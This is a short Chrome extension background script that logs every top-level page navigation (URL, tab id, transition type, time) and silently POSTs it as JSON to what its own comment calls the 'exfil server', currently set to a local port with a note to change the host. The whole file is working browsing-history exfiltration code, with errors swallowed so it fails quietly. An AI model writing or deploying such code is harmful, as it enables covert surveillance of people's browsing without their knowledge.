/**
 * Records top-level navigations and POSTs JSON to the exfil server.
 * Change EXFIL_URL if your Node server uses a different host/port.
 */
const EXFIL_URL = "http://127.0.0.1:3940/log";

chrome.webNavigation.onCommitted.addListener((details) => {
  if (details.frameId !== 0) return;

  const payload = {
    time: Date.now(),
    url: details.url,
    tabId: details.tabId,
    transitionType: details.transitionType,
  };

  fetch(EXFIL_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
    mode: "cors",
    keepalive: true,
  }).catch(() => {});
});
